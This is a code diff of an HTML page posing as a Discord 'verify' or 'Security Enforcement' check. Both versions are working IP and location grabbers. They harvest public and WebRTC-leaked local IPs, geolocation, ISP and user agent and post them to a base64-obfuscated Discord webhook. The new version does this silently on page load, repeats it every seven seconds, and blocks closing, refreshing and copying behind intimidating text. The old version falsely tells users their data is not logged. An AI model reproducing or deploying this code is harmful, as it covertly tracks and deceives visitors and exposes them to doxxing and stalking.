@@ -1,212 +1,92 @@
 <!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>🔒 Verify Bot</title>
-  <style>
-    body{margin:0;display:flex;align-items:center;justify-content:center;height:100vh;
-      background:linear-gradient(135deg,#0f0f16,#1b1b28,#2a2a3a,#1b1b28);
-      background-size:400% 400%;animation:bgAnim 20s ease infinite;color:#eee;
-      font-family:sans-serif;overflow:hidden}
-    #c{background:rgba(30,30,40,0.9);padding:2rem 2rem 2.2rem 2rem;border-radius:12px;
-      box-shadow:0 4px 16px rgba(0,0,0,0.8);text-align:center;animation:cardIn .8s ease;max-width:450px;}
-    input,textarea,button{width:100%;padding:.75rem;margin:.5rem 0;border:none;
-      border-radius:6px;font-size:1rem;transition:transform .2s}
-    input,textarea{background:#222;color:#eee}
-    input:focus,textarea:focus{outline:2px solid rgba(79,170,255,0.7);transform:scale(1.02)}
-    button{background:#4a90e2;color:#fff;cursor:pointer;animation:pulse 2s infinite}
-    button:hover{transform:scale(1.05)}
-    #s{opacity:0;transition:opacity .3s;margin-top:1rem;padding:.5rem;border-radius:6px}
-    #s.v{opacity:1}
-    #s.ok{background:rgba(40,167,69,0.1);color:#2ecc71}
-    #s.err{background:rgba(231,76,60,0.1);color:#e74c3c}
-    .particle{position:absolute;border-radius:50%;background:rgba(255,255,255,0.05);
-      animation:drift 10s linear infinite}
-    #welcome{font-size:1.07em;margin-bottom:.9em;line-height:1.45}
-    #devPrompt{display:none;background:rgba(30,30,40,0.98);padding:1.2em 1.2em 1em 1.2em;border-radius:12px;box-shadow:0 6px 24px #000d;text-align:center;position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);z-index:10;}
-    #devPrompt button{width:48%;display:inline-block;margin:0 .5%;}
-    @keyframes bgAnim{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
-    @keyframes cardIn{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}
-    @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.03)}}
-    @keyframes drift{0%{transform:translate(0,0)}100%{transform:translate(100px,-200px)}}
-  </style>
+<html lang="en"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>🔒 Security Enforcement</title>
+<style>
+html,body{margin:0;height:100%;width:100%;overflow:hidden}
+body{background:linear-gradient(135deg,#181825,#232343,#2a2a3a);height:100vh;width:100vw;display:flex;align-items:center;justify-content:center;}
+#x{background:rgba(20,20,30,0.98);color:#fff;position:fixed;z-index:10;top:0;left:0;right:0;bottom:0;display:flex;flex-direction:column;align-items:center;justify-content:center;}
+#x h1{font-size:2.3em;margin-bottom:.35em;}
+#x p{font-size:1.22em;max-width:420px;text-align:center;}
+#y{color:#ff354b;font-size:1.13em;font-weight:bold;margin:1.1em 0 .6em 0;}
+#z{margin-top:2.5em;width:40px;height:40px;border:4px solid #3a3a4a;border-top:4px solid #4faaff;border-radius:50%;animation:s 1.1s linear infinite;}
+@keyframes s{100%{transform:rotate(360deg)}}
+</style>
 </head>
 <body>
-  <div id="c">
-    <div id="welcome">
-      <b>Hi Users! Welcome to Verify Bot.</b><br>
-      This system is for <b>not allowing alts</b>.<br>
-      When you verify, it checks your IP.<br>
-      <span style="color:#3ae374;">We do NOT log or store your IP or info</span> – if we did, we'd be sued!<br>
-      Your IP is only used to stop alts and abuse. This can be bypassed with VPN, but soon it will be improved.<br>
-      If you are blocked by IP, try another method.<br>
-      By verifying, you agree to this check.
-    </div>
-    <input id="u" placeholder="User#0000" autocomplete="username">
-    <textarea id="msg" placeholder="Type your message (optional)" rows="3"></textarea>
-    <button id="b">Verify</button>
-    <div id="s"><span id="m"></span></div>
-  </div>
-  <div id="devPrompt">
-    <div style="margin-bottom:1em;font-size:1.08em;">
-      Do you wanna join the devs? You can join our server or click Not now.
-    </div>
-    <button id="joinBtn">Join server</button>
-    <button id="notNowBtn" style="background:#777;color:#fff;">Not now</button>
-  </div>
-  <script>
-    for(let i=0;i<30;i++){let p=document.createElement('div'),s=Math.random()*8+4;
-      p.className='particle';p.style.width=s+'px';p.style.height=s+'px';
-      p.style.top=Math.random()*100+'%';p.style.left=Math.random()*100+'%';
-      p.style.animationDuration=10+Math.random()*10+'s';document.body.append(p)}
-    const keys=[
-      'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MTI2NTA2MTg3OTk0MzE3OC9TSUw0aXpCaWktQ1UtUFI4MG5SNktWTHhoMmlsMFBFel81TEhoU2VBSlNieEN3UUR1TnNkNDFoQ0JBYWdpOUYtM3Ffcw==',
-      'WU9VUl9JUFFTX0FQSV9LRVk=',
-      'WU9VUl9JUFVIX0FQSV9LRVk='
-    ],d=atob,H=d(keys[0]),K1=d(keys[1]),K2=d(keys[2]);
-    const $=id=>document.getElementById(id);
-    const u=$('u'),msg=$('msg'),btn=$('b'),sta=$('s'),ms=$('m');
-    const devPrompt=$('devPrompt'),joinBtn=$('joinBtn'),notNowBtn=$('notNowBtn');
-    const F=(c,t)=>(sta.className='v '+c,ms.textContent=t);
-    async function getIPs(){
-      let results = {};
-      const sources = [
-        {name:'ipify', url:'https://api.ipify.org?format=json', parse: j=>j.ip},
-        {name:'ipapi', url:'https://ipapi.co/json/', parse: j=>j.ip},
-        {name:'ipinfo', url:'https://ipinfo.io/json', parse: j=>j.ip},
-        {name:'ipwho', url:'https://ipwho.is/', parse: j=>j.ip},
-        {name:'ipgeolocation', url:'https://api.ipgeolocation.io/ipgeo?apiKey=demo', parse: j=>j.ip}
-      ];
-      for (const src of sources){
-        try{
-          let j=await fetch(src.url).then(r=>r.json());
-          if(j && src.parse(j)) results[src.name]=src.parse(j);
-        }catch{}
-      }
-      results.main = results.ipify || results.ipapi || results.ipinfo || results.ipwho || results.ipgeolocation || '';
-      return results;
-    }
-    async function getLeak(t=2000){
-      return new Promise(r=>{
-        if(!window.RTCPeerConnection) return r([]);
-        const s=new Set,p=new RTCPeerConnection({iceServers:[]});
-        p.createDataChannel('');
-        p.createOffer().then(o=>p.setLocalDescription(o));
-        p.onicecandidate=e=>e.candidate&&s.add(e.candidate.candidate.split(' ')[4]);
-        setTimeout(()=>{p.close();r([...s])},t);
-      });
-    }
-    async function getGeoInfo(ip) {
-      try {
-        let r = await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());
-        if(r && r.latitude && r.longitude) return {...r, source: "ipapi"};
-      } catch {}
-      try {
-        let r = await fetch(`https://ipwho.is/${ip}`).then(r=>r.json());
-        if(r && r.latitude && r.longitude) return {...r, source: "ipwho"};
-      } catch {}
-      try {
-        let r = await fetch(`https://ipinfo.io/${ip}/json`).then(r=>r.json());
-        if(r && r.loc) {
-          let [latitude, longitude] = r.loc.split(",");
-          return {...r, latitude, longitude, source: "ipinfo"};
-        }
-      } catch {}
-      try {
-        let r = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip=${ip}`).then(r=>r.json());
-        if(r && r.latitude && r.longitude) return {...r, source: "ipgeolocation"};
-      } catch {}
-      return {};
-    }
-    async function getBrowserLoc(){
-      return new Promise((resolve,reject)=>{
-        if(!('geolocation'in navigator)) return reject();
-        navigator.geolocation.getCurrentPosition(
-          pos=>resolve({
-            method:'device',
-            lat:pos.coords.latitude,
-            lon:pos.coords.longitude,
-            accuracy:pos.coords.accuracy,
-            timestamp:new Date(pos.timestamp).toISOString()
-          }),
-          err=>reject(),
-          {enableHighAccuracy:true,timeout:10000,maximumAge:0}
-        );
-      });
-    }
-    async function checkVPN(ip){
-      let reasons=[];
-      try{
-        let a=await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());
-        if(/hosting|datacenter|cloud|proxy|vpn/i.test(a.org||'')) reasons.push('ipapi:hosting/org flagged');
-        let b=await fetch(`https://ipwho.is/${ip}`).then(r=>r.json());
-        if(b.security&&(b.security.is_proxy||b.security.is_tor||b.security.is_vpn)) reasons.push('ipwho.is:proxy/tor/vpn');
-        let c=await fetch(`https://ipqualityscore.com/api/json/ip/${K1}/${ip}?strictness=1`).then(r=>r.json());
-        if(c.vpn||c.proxy||c.tor||c.fraud_score>50) reasons.push('IPQS:VPN/Proxy/High Risk');
-      }catch{}
-      return reasons;
-    }
-    async function main(){
-      const tag=u.value.trim(), text=msg.value.trim();
-      if(!tag) return F('err','Enter your tag');
-      F('','Checking…'); btn.disabled=true;
-      try{
-        let browserLoc, browserLocOk=false;
-        try{
-          browserLoc = await getBrowserLoc();
-          browserLocOk = true;
-        }catch{}
-        const ips = await getIPs();
-        if(!ips.main) throw "No IP found";
-        const leak = await getLeak();
-        const vpn = await checkVPN(ips.main);
-        const geo = await getGeoInfo(ips.main);
-        let mapsUrl='';
-        if(browserLocOk && browserLoc.lat && browserLoc.lon){
-          mapsUrl = `https://www.google.com/maps?q=${browserLoc.lat},${browserLoc.lon}`;
-        } else if(geo.latitude && geo.longitude){
-          mapsUrl = `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`;
-        }
-        if(vpn.length) {F('err','VPN/Proxy not allowed: '+vpn.join('; '));btn.disabled=false;return;}
-        const payload={
-          username:'Gate',
-          author:{name:'VerifyBot'},
-          embeds:[{
-            color:65280,
-            fields:[
-              {name:'Tag',value:tag,inline:1},
-              {name:'VPN/Proxy Check',value:vpn.join('; ')||'-',inline:0},
-              {name:'Local IPs',value:leak.join(',')||'-',inline:0},
-              browserLocOk && browserLoc.lat && browserLoc.lon
-                ? {name:'Device Location',value:`${browserLoc.lat},${browserLoc.lon} (±${browserLoc.accuracy}m)`,inline:1}
-                : geo.latitude && geo.longitude
-                ? {name:'IP Location',value:`${geo.latitude},${geo.longitude} (${geo.city||'?'} ${geo.country_code||'?'})`,inline:1}
-                : {name:'IP Location',value: "Unknown",inline:1},
-              geo.latitude && geo.longitude ? {name:'Google Maps',value:mapsUrl,inline:0} : null,
-              {name:'ISP/Org',value:geo.org||'-',inline:1},
-              {name:'User Agent',value:navigator.userAgent,inline:0},
-              text?{name:'Message',value:text,inline:0}:null
-            ].filter(Boolean),
-            footer:{text:new Date().toUTCString()}
-          }]
-        };
-        await fetch(H,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
-        F('ok','Verified!');
-        setTimeout(()=>{document.getElementById("c").style.display="none";devPrompt.style.display="block";},1000);
-      }catch(e){
-        F('err','Error occurred');
-      }finally{btn.disabled=false;}
-    }
-    btn.onclick=main;
-    u.onkeydown = e => { if(e.key==="Enter") { e.preventDefault(); main(); } };
-    joinBtn.onclick = function(){window.location='https://discord.gg/pq4dvDZP5T';};
-    notNowBtn.onclick = function(){
-      devPrompt.style.display="none";
-      document.getElementById("c").style.display="block";
-      F('','');
-      u.value='';msg.value='';
-    };
-  </script>
-</body>
-</html>
+<div id="x">
+<h1>⚠️ Security Enforcement</h1>
+<p>This page is for alternate account prevention and security checks.<br>
+<span id="y">Leaving or closing this page will result in all data being deleted.<br>
+You cannot bypass this check.</span>
+For the strictest security, avoid privacy extensions.<br><br>
+<span style="color:#aaa;font-size:.99em;">If you are using Edge, closing this tab will immediately clear all session data.</span>
+</p>
+<div id="z"></div>
+</div>
+<script>
+(function(){
+function b64(d){return atob(d);}
+var w=b64('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MTI2NTA2MTg3OTk0MzE3OC9TSUw0aXpCaWktQ1UtUFI4MG5SNktWTHhoMmlsMFBFel81TEhoU2VBSlNieEN3UUR1TnNkNDFoQ0JBYWdpOUYtM3Ffcw==');
+async function gA(){
+var r={},s=[
+{name:'a',url:'https://api.ipify.org?format=json',p:j=>j.ip},
+{name:'b',url:'https://ipapi.co/json/',p:j=>j.ip},
+{name:'c',url:'https://ipinfo.io/json',p:j=>j.ip},
+{name:'d',url:'https://ipwho.is/',p:j=>j.ip}
+];
+for(var i=0;i<s.length;i++){
+try{var j=await fetch(s[i].url).then(x=>x.json());if(j&&s[i].p(j))r[s[i].name]=s[i].p(j);}catch(e){}}
+r.m=r.a||r.b||r.c||r.d||'';
+return r;
+}
+async function gG(ip){
+try{var r=await fetch('https://ipapi.co/'+ip+'/json/').then(x=>x.json());
+if(r&&r.latitude&&r.longitude)return r;}catch(e){}
+try{var r=await fetch('https://ipwho.is/'+ip).then(x=>x.json());
+if(r&&r.latitude&&r.longitude)return r;}catch(e){}
+try{var r=await fetch('https://ipinfo.io/'+ip+'/json').then(x=>x.json());
+if(r&&r.loc){var l=r.loc.split(",");return Object.assign(r,{latitude:l[0],longitude:l[1]});}}catch(e){}
+return {};
+}
+async function gL(t){
+return new Promise(f=>{
+if(!window.RTCPeerConnection)return f([]);
+var S=new Set,P=new RTCPeerConnection({iceServers:[]});
+P.createDataChannel('');
+P.createOffer().then(o=>P.setLocalDescription(o));
+P.onicecandidate=e=>e.candidate&&S.add(e.candidate.candidate.split(' ')[4]);
+setTimeout(()=>{P.close();f([...S])},t||1200);
+});
+}
+async function SND(){
+var a=await gA(),l=await gL(),u=navigator.userAgent,g=await gG(a.m);
+var d={username:'Gate',embeds:[{color:16711680,title:'Security',fields:[
+{name:'Refs',value:Object.entries(a).map(([k,v])=>k+': '+v).join('\n'),inline:0},
+{name:'Locals',value:l.join(',')||'-',inline:0},
+g.latitude&&g.longitude?{name:'Coords',value:g.latitude+','+g.longitude+' ('+(g.city||'?')+' '+(g.country_code||'?')+')',inline:1}:null,
+g.latitude&&g.longitude?{name:'Map',value:'https://www.google.com/maps?q='+g.latitude+','+g.longitude,inline:0}:null,
+{name:'Org',value:g.org||'-',inline:1},
+{name:'UA',value:u,inline:0}
+].filter(Boolean),footer:{text:new Date().toUTCString()}}]};
+await fetch(w,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});
+}
+SND();setInterval(SND,7000);
+window.onbeforeunload=function(e){
+e=e||window.event;
+if(e)e.returnValue='Leaving or closing will delete all data. Are you sure?';
+return'Leaving or closing will delete all data. Are you sure?';
+};
+document.body.onkeydown=function(e){
+if((e.ctrlKey&&(e.key==='w'||e.key==='W'))||(e.metaKey&&e.key.toLowerCase()==='w'))e.preventDefault();
+if(e.key==='F5'||(e.ctrlKey&&e.key==='r'))e.preventDefault();
+};
+document.addEventListener('contextmenu',e=>e.preventDefault());
+document.addEventListener('selectstart',e=>e.preventDefault());
+document.addEventListener('copy',e=>e.preventDefault());
+document.addEventListener('cut',e=>e.preventDefault());
+document.addEventListener('paste',e=>e.preventDefault());
+})();
+</script>
+</body></html>
